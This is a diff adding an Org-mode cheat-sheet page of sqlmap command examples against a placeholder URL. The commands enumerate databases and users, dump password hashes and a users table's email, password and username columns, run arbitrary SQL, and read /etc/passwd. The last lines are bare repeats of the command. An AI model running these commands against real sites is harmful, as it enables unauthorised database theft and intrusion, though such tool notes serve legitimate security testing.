@@ -1,0 +1,22 @@
+#+TITLE: sqlmap
+#+LINK_UP: index.html
+#+LINK_HOME: index.html
+
+* Example
+  #+BEGIN_SRC sh
+    sqlmap -u "http://example.com"
+    sqlmap -u "http://example.com" --dbs
+    sqlmap -u "http://example.com" --users
+    sqlmap -u "http://example.com" --current-user --threads 5
+    sqlmap -u "http://example.com" --tables -D "scut" # 获取表名
+    sqlmap -u "http://example.com" --passwords
+    sqlmap -u "http://example.com" --dump-all
+    sqlmap -u "http://example.com" --columns -T "users" -D "scut"
+    sqlmap -u "http://example.com" --dump -C "email,password,username" -T "users" -D "scut"
+    sqlmap -u "http://example.com" --dump -T "users" -D "scut"
+    sqlmap -u "http://example.com" --sql-query "SELECT @@datadir"
+    sqlmap -u "http://example.com" --file-read="/etc/passwd"
+    sqlmap -u "http://example.com"
+    sqlmap -u "http://example.com"
+    sqlmap -u "http://example.com"
+  #+END_SRC
